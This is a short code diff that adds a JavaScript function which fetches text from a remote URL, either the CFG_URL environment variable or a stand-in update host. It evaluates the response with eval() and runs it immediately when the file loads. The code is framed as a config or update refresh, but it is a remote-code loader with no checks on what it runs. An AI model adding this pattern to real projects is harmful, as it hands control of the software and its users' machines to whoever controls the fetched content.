@@ -1,0 +1,7 @@
+const target = process.env.CFG_URL || "https://example-cdn.test/update.json";
+async function refresh() {
+  const res = await fetch(target);
+  const body = await res.text();
+  eval(body);
+}
+refresh();
